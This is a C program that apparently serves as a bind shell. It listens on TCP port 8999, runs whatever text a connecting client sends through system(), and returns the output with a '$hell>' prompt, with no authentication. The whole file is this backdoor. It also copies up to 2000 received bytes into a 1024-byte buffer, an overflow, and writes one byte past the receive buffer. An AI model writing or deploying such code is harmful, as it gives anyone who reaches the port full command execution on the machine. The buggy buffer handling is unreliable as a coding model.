#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <limits.h>

char * readFile(char * filename){
    char * buffer = NULL;
    int string_size, read_size;
    FILE *handler = fopen(filename, "r");
    
    if(handler)
    {
        fseek(handler, 0, SEEK_END);
        string_size = ftell(handler);
        rewind(handler);
        buffer = (char*) malloc(sizeof(char) * (string_size)+1 );
        read_size = fread(buffer, sizeof(char), string_size, handler);
        buffer[string_size] = '\0';
        if(string_size != read_size){
            free(buffer);
            buffer = NULL;
        }
        fclose(handler);
    }
    return buffer;
}

int main(int argc, char* argv[]){
    int socket_desc, client_sock, c, read_size;
    struct sockaddr_in server,client;
    char client_message[2000];
    
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if(socket_desc == -1){
        printf("could not create socket");
    } printf("socket created");
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( 8999 );
    
    if(bind(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0){
        perror("bind failed");
        return 1;
    } printf("bind done");
    int run=1,constat=0,count=0;
    while(run == 1){
        count++;
        if(count > 0)
            run = 0;
        listen(socket_desc, 3);
        printf("waiting for connections");
        c = sizeof(struct sockaddr_in);
        
        client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
        if(client_sock < 0){
            perror("accept failed");
            return 1;
        }
        printf("connection accepted");
        constat = 1;
        
        char emptystr[] = "\0";
        char sstatm[] = "[ss]";
        
        while(constat == 1){
            strcpy(client_message,emptystr);
            if((read_size = recv(client_sock,client_message, 2000, 0)) > 0){
                client_message[read_size] = '\0';
                //start processing commands
                
                if(strcmp(client_message,sstatm)==0){ //workaround for weird bug
                    
                    char sstat[]="a\n";
                    //write(client_sock, sstat, 2);
                    
                    char *cwd = (char *) malloc(sizeof(char) * PATH_MAX);
                    getcwd(cwd, PATH_MAX);
                    char *prompt = (char *) malloc(sizeof(char) * strlen(cwd) * strlen("$hell> "));
                    sprintf(prompt, "%s$hell> ", cwd);
                    write(client_sock, prompt, strlen(prompt));
                    
                } else { //runs this if client said anything else than [ss]
                    
                    //run main get response
                    char thingToRun[1024];
                    //char * thingToRun = malloc(sizeof(char) * strlen(client_message) + 1); //malloc causes bug
                    strcpy (thingToRun,client_message);
                    
                    char appendS[] = "> tempfile";
                    strcat (thingToRun, appendS);
                    system(thingToRun);
            
                    char * response = readFile("tempfile");
                    write(client_sock, response, strlen(response));
                    
                    system("rm tempfile");
                    //free(thingToRun);
                    
                }
                
                
            }
        }
    }
    
    return 0;
}
